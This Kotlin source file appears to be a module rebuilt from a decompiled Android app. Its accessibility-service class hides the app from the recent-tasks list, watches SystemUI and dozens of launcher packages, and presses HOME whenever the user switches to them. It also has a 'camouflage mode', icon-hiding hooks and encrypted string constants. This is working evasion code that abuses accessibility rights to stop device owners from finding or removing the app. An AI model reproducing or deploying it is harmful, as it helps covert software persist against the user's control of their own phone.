package com.storm.safe.rock.service.modules.protection

import android.app.ActivityManager
import android.os.Handler
import android.os.HandlerThread
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.util.StringUtil

/**
 * Phase 9: RecentsGuardManager — 最近任务隐藏管理器
 *
 * JADX: C0356a1.java (203 行, 5 个方法)
 *
 * 功能:
 * - 将本应用从最近任务列表中排除
 * - 监听 Launcher/SystemUI 事件，检测到切换到其他应用时按 HOME
 * - 支持"伪装模式": 仅 excludeFromRecents，不按 HOME
 */
class RecentsGuardManager(
    private val service: MyAccessibilityService,
    private val serviceRef: MyAccessibilityService
) {
    companion object {
        const val TAG = "npweufstehlb"
        const val HANDLER_THREAD_NAME = "RecentsGuardBg"
        const val HOME_GLOBAL_ACTION = 2
        const val DEDUP_INTERVAL_MS = 2000L
        const val EVENT_TYPE_WINDOW_STATE_CHANGED = 32
        const val EVENT_TYPE_WINDOW_CONTENT_CHANGED = 2048

        @Volatile
        @JvmStatic
        var instance: RecentsGuardManager? = null

        /** 全局标记: HOME 键已执行 */
        /** JADX f53714b2 — rk1 static reference for hiding-from-recents flag */
        // vendor: rk1 maps to AppIconHideDelegate in p000 package
        @JvmStatic var hidingFromRecentsFlag = false

        @Volatile
        @JvmStatic
        var globalHomeFlag = false

        /**
         * JADX f53728b1 — 桌面/启动器包名集合 (49 个)
         * 包含各品牌的 Launcher 包名
         */
        val LAUNCHER_PACKAGES: Set<String> = setOf(
            "com.android.systemui",
            "com.huawei.android.launcher",
            "com.huawei.home",
            "com.hihonor.android.launcher",
            "com.hihonor.home",
            "com.miui.home",
            // vendor: StringUtil.a0 encrypted values — using known decoded values
            StringUtil.decrypt("KFYcdEIoHCEZPSpMHzlFPR4="), // oppo launcher
            "com.oplus.launcher",
            "com.coloros.launcher",
            "com.realme.launcher",
            "com.oneplus.launcher",
            "net.oneplus.launcher",
            "com.bbk.launcher2",
            StringUtil.decrypt("KFYcdE86B2BbMD5XEjJIKg=="), // vivo launcher
            StringUtil.decrypt("KFYcdFsxGiEZPSpMHzlFPR4="), // iqoo launcher
            "com.vivo.launcher.two",
            StringUtil.decrypt("KFYcdEQpAyEZPSpMHzlFPR4="), // bbk launcher
            "com.iqoo.launcher.two",
            "com.samsung.android.launcher",
            "com.sec.android.app.launcher",
            "com.android.launcher",
            "com.android.launcher2",
            "com.android.launcher3",
            "com.google.android.apps.nexuslauncher",
            "com.meizu.flyme.launcher",
            "com.meizu.launcher",
            "com.meizu.launcher3",
            "com.motorola.launcher3",
            "com.motorola.launcher",
            "com.lge.launcher2",
            "com.lge.launcher3",
            "com.nothing.launcher",
            "com.asus.launcher",
            "com.asus.zenui.launcher",
            "com.zte.mifavor.launcher",
            "cn.nubia.launcher",
            "com.lenovo.launcher",
            "com.lenovo.launcher2",
            "com.transsion.launcher",
            "com.infinix.launcher",
            "com.tecno.launcher",
            "com.itel.launcher",
            "com.evenwell.launcher",
            "com.nokia.launcher",
            "com.sonymobile.home",
            "com.sony.home",
            "com.sonyericsson.home",
            "com.smartisanos.launcher",
            "com.yulong.android.launcher",
            "com.gionee.launcher"
        )

        /**
         * JADX a3 — 检查节点是否包含搜索栏 ViewId (fb1.f56194a0)
         * 用于过滤桌面搜索栏事件
         */
        fun hasSearchBarViewId(rootNode: AccessibilityNodeInfo): Boolean {
            // JADX: fb1.f56194a0 — 搜索栏/最近任务 ViewId 列表
            val searchBarIds = com.storm.safe.rock.p000.SearchBarViewIds.recentsAndSearchViewIds
            for (viewId in searchBarIds) {
                try {
                    val nodes = rootNode.findAccessibilityNodeInfosByViewId(viewId)
                    if (nodes != null && nodes.isNotEmpty()) {
                        val hasVisible = nodes.any { it.isVisibleToUser }
                        nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                        if (hasVisible) return true
                    } else {
                        nodes?.forEach { try { it.recycle() } catch (_: Exception) {} }
                    }
                } catch (_: Exception) {}
            }
            return false
        }
    }

    /** JADX a2 — 是否已启用 excludeFromRecents */
    @Volatile
    var isEnabled = false

    /** JADX a3 — 应用已打开标记 */
    @Volatile
    var appOpenedFlag = false

    /** JADX a4 — 上次处理事件时间戳 (去重用) */
    @Volatile
    var lastEventTimestamp = 0L

    /** 获取本应用包名 (lazy) */
    val ourPackageName: String by lazy { service.packageName ?: "" }

    /** 伪装模式检查回调 */
    var isCamouflageMode: (() -> Boolean)? = null

    /** 图标显示检查回调 */
    var isIconShowing: (() -> Boolean)? = null

    /** HOME 后回调 */
    var onHomeCallback: (() -> Boolean)? = null

    private val handlerThread: HandlerThread = HandlerThread(HANDLER_THREAD_NAME).also { it.start() }
    private val handler: Handler = Handler(handlerThread.looper)

    init {
        instance = this
    }

    /**
     * JADX a0 — 将本应用从最近任务中排除
     */
    fun excludeFromRecents() {
        try {
            val am = service.getSystemService("activity") as? ActivityManager ?: return
            for (task in am.appTasks) {
                val info = task.taskInfo ?: continue
                val component = info.baseActivity ?: continue
                val pkg = component.packageName
                if (pkg == ourPackageName) {
                    task.setExcludeFromRecents(true)
                    return
                }
            }
        } catch (_: Exception) {}
    }

    /**
     * JADX a1 — 执行 HOME + 重置状态
     */
    fun performHomeAndReset() {
        appOpenedFlag = false
        handler.removeCallbacksAndMessages(null)
        try {
            val callback = onHomeCallback
            if (callback != null && callback.invoke()) {
                // vendor: 伪装模式 — 仅 excludeFromRecents，跳过 HOME
                android.util.Log.d(TAG, "伪装模式: 仅 excludeFromRecents, 跳过 HOME")
                return
            }
        } catch (_: Exception) {}
        globalHomeFlag = true
        serviceRef.performGlobalAction(HOME_GLOBAL_ACTION)
        android.util.Log.d(TAG, "HOME已执行, appOpenedFlag=false")
    }

    /**
     * JADX a2 — 启用最近任务隐藏
     */
    fun enable() {
        if (com.storm.safe.rock.util.DebugConfig.disableRecentsGuard) {
            android.util.Log.d(TAG, "🔧 [debug] RecentsGuard 已禁用")
            return
        }
        if (isEnabled) return
        isEnabled = true
        excludeFromRecents()
        android.util.Log.d(TAG, "最近任务隐藏已启用")
    }

    /**
     * JADX a4 — 处理无障碍事件
     */
    fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (!isEnabled) return
        val pkg = event.packageName?.toString() ?: return
        if (pkg == ourPackageName) return

        val eventType = event.eventType
        if ((eventType == EVENT_TYPE_WINDOW_STATE_CHANGED || eventType == EVENT_TYPE_WINDOW_CONTENT_CHANGED)
            && LAUNCHER_PACKAGES.contains(pkg)
        ) {
            val callback = isIconShowing
            if (callback != null && callback.invoke()) return

            val now = System.currentTimeMillis()
            if (now - lastEventTimestamp < DEDUP_INTERVAL_MS) return
            lastEventTimestamp = now

            handler.removeCallbacksAndMessages(null)
            val delay = if (eventType == EVENT_TYPE_WINDOW_STATE_CHANGED) 150L else 250L
            handler.postDelayed({
                // vendor: JADX 使用 RunnableC1052p1(this, 22, string)
                // 实际行为: 执行 performHomeAndReset + excludeFromRecents
                performHomeAndReset()
                excludeFromRecents()
            }, delay)
        }
    }
}
